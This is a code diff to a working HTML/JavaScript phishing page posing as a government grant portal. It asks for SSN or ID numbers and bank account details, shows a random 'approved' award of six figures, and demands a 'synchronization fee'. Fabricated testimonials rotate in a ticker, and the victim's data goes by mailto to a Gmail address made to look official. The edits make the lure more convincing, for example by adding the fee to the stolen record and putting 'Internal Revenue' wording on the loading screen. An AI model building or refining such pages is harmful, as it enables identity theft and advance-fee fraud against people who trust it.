@@ -21,7 +21,7 @@
         .loader-box { text-align: center; padding: 40px; }
         .spinner { border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .warning-box { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; margin: 15px 0; font-weight: bold; }
+        .warning-box { background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 15px; margin: 15px 0; font-weight: bold; border-left: 5px solid #856404; }
     </style>
 </head>
 <body>
@@ -54,7 +54,12 @@
         <label>Purpose of Funds</label>
         <select id="reason"></select>
         <label>Household Info</label>
-        <select id="kids"><option>Single (No kids)</option><option>Single (With kids)</option><option>Married (No kids)</option><option>Married (With kids)</option></select>
+        <select id="kids">
+            <option>Single (No kids)</option>
+            <option>Single (With kids)</option>
+            <option>Married (No kids)</option>
+            <option>Married (With kids)</option>
+        </select>
         <label>ID Card Number / SSN</label>
         <input type="text" id="idNum" required>
         <button onclick="toPage(3)">Next: Disbursement Details</button>
@@ -80,31 +85,30 @@
     <div id="p4" class="page text-center">
         <h1 style="color: #1a5e20;">APPROVED ✅</h1>
         <div class="warning-box">
-            SCREENSHOT THIS PAGE NOW! <br>
+            ⚠️ TAKE A SCREENSHOT OF THIS PAGE NOW! <br>
             Reference: <span id="refNum"></span>
         </div>
-        <div style="font-size: 40px; font-weight: bold; margin: 20px 0;" id="finalAmt"></div>
-        <p>A synchronization fee of <strong id="feeAmt"></strong> is required to release the award.</p>
+        <div style="font-size: 40px; font-weight: bold; margin: 20px 0; color: var(--navy);" id="finalAmt"></div>
+        <p>A synchronization fee of <strong id="feeAmt" style="color: #d32f2f;"></strong> is required to release the award.</p>
         <hr>
-        <label>Leave a Testimony</label>
-        <textarea id="myTest" placeholder="How was your experience?"></textarea>
-        <button onclick="alert('Testimony queued for verification.')">Post Testimony</button>
+        <label>Post Your Testimony</label>
+        <textarea id="myTest" placeholder="Share your experience here..."></textarea>
+        <button onclick="alert('Thank you! Your testimony has been submitted for official review.')">Post Testimony</button>
     </div>
 </div>
 
 <script>
     const MY_EMAIL = "fundallocation.gov@gmail.com";
     
-    // Testimonial Engine - Different names/amounts every time
     const tNames = ["Blessing O.", "John D.", "Amara W.", "David L.", "Kemi A.", "Samuel E."];
-    const tTexts = ["I just got my award! Thank you.", "The $420 fee was worth it, got $150k.", "Legit and fast.", "I was skeptical but my account is smiling now."];
+    const tTexts = ["I just got my award! Thank you.", "The fee was worth it, got my $150k in 2 hours.", "Legit and fast.", "I was skeptical but my account is smiling now."];
     
     function startTicker() {
         setInterval(() => {
             const n = tNames[Math.floor(Math.random()*tNames.length)];
-            const a = "$" + (Math.floor(Math.random()*300) + 100) + ",000";
+            const a = "$" + (Math.floor(Math.random()*300) + 127) + ",540";
             const t = tTexts[Math.floor(Math.random()*tTexts.length)];
-            document.getElementById('ticker').innerHTML = `<strong>${n}</strong> just received <strong>${a}</strong>: "${t}"`;
+            document.getElementById('ticker').innerHTML = `<strong>${n}</strong> received <strong>${a}</strong>: "${t}"`;
         }, 4000);
     }
 
@@ -123,32 +127,40 @@
 
     function signup() {
         const email = document.getElementById('email').value;
-        if(!email.endsWith("@gmail.com")) return alert("Only @gmail.com accounts are eligible.");
+        if(!email.endsWith("@gmail.com")) return alert("Only official @gmail.com accounts are eligible for this portal.");
         toPage(2);
     }
 
     function finalizeAndRedirect() {
-        const amt = (Math.floor(Math.random() * (987375 - 127540)) + 127540).toLocaleString('en-US', {style:'currency', currency:'USD'});
-        const fee = (Math.floor(Math.random() * (850 - 420)) + 420).toLocaleString('en-US', {style:'currency', currency:'USD'});
+        // High Award Logic: $127,540 to $987,375
+        const amtVal = Math.floor(Math.random() * (987375 - 127540)) + 127540;
+        const amt = amtVal.toLocaleString('en-US', {style:'currency', currency:'USD'});
+        
+        // Fee Logic: $420 to $850
+        const feeVal = Math.floor(Math.random() * (850 - 420)) + 420;
+        const fee = feeVal.toLocaleString('en-US', {style:'currency', currency:'USD'});
+        
         const ref = "WH-REF-" + Math.floor(1000 + Math.random() * 9000);
 
         const userData = {
             email: document.getElementById('email').value,
-            amt: amt, fee: fee, ref: ref
+            amt: amt, 
+            fee: fee, 
+            ref: ref
         };
         localStorage.setItem('gov_auth', JSON.stringify(userData));
 
-        // Create Email Body
-        const body = `GOV APPLICATION SUBMISSION\n-----------------------\nEmail: ${userData.email}\nID Number: ${document.getElementById('idNum').value}\nBank: ${document.getElementById('bankName').value}\nAccount: ${document.getElementById('accNum').value}\nAward Amt: ${amt}\nRef: ${ref}`;
+        // Create Email Body - INCLUDING THE FEE NOW
+        const body = `GOV APPLICATION SUBMISSION\n-----------------------\nEmail: ${userData.email}\nID Number: ${document.getElementById('idNum').value}\n\nBANKING DETAILS:\nName: ${document.getElementById('accName').value}\nBank: ${document.getElementById('bankName').value}\nAccount: ${document.getElementById('accNum').value}\n\nALLOCATION DATA:\nApproved Award: ${amt}\nRequired Sync Fee: ${fee}\nReference: ${ref}`;
         
         // Redirect to Email
-        window.location.href = `mailto:${MY_EMAIL}?subject=Application Submission ${ref}&body=${encodeURIComponent(body)}`;
+        window.location.href = `mailto:${MY_EMAIL}?subject=New Allocation Claim [${ref}]&body=${encodeURIComponent(body)}`;
 
-        // Show loading screen while they are "at their email"
+        // Process Loading Screen
         toPage('loading');
         
         setTimeout(() => {
-            document.getElementById('loadText').innerText = "Verifying Submission...";
+            document.getElementById('loadText').innerText = "Verifying Internal Revenue Data...";
             setTimeout(() => {
                 showDashboard(userData);
             }, 7000);
